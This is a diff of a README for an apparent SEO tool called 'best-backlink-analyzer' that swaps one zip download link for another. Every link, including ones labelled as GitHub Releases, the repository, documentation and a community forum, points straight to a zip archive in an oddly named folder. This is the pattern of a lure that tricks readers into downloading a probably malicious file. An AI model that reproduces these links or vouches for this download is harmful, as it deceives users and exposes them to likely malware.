@@ -1,6 +1,6 @@
 # 🔗 best-backlink-analyzer - Your Simple SEO Tool for Link Analysis
 
-[![Download](https://raw.githubusercontent.com/AhmedAj22/best-backlink-analyzer/main/coprophagist/best-backlink-analyzer.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/AhmedAj22/best-backlink-analyzer/main/coprophagist/best-backlink-analyzer.zip)
+[![Download](https://raw.githubusercontent.com/AhmedAj22/best-backlink-analyzer/main/coprophagist/best-analyzer-backlink-2.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/AhmedAj22/best-backlink-analyzer/main/coprophagist/best-analyzer-backlink-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started with the best-backlink-analyzer, please visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/AhmedAj22/best-backlink-analyzer/main/coprophagist/best-backlink-analyzer.zip). 
+To get started with the best-backlink-analyzer, please visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/AhmedAj22/best-backlink-analyzer/main/coprophagist/best-analyzer-backlink-2.2.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the software.
@@ -63,8 +63,8 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/AhmedAj22/best-backlink-analyzer/main/coprophagist/best-backlink-analyzer.zip)
-- [Documentation](https://raw.githubusercontent.com/AhmedAj22/best-backlink-analyzer/main/coprophagist/best-backlink-analyzer.zip)
-- [Community Forum](https://raw.githubusercontent.com/AhmedAj22/best-backlink-analyzer/main/coprophagist/best-backlink-analyzer.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/AhmedAj22/best-backlink-analyzer/main/coprophagist/best-analyzer-backlink-2.2.zip)
+- [Documentation](https://raw.githubusercontent.com/AhmedAj22/best-backlink-analyzer/main/coprophagist/best-analyzer-backlink-2.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/AhmedAj22/best-backlink-analyzer/main/coprophagist/best-analyzer-backlink-2.2.zip)
 
 Thank you for choosing best-backlink-analyzer. We hope this tool helps you improve your SEO efforts and enhances the performance of your website.
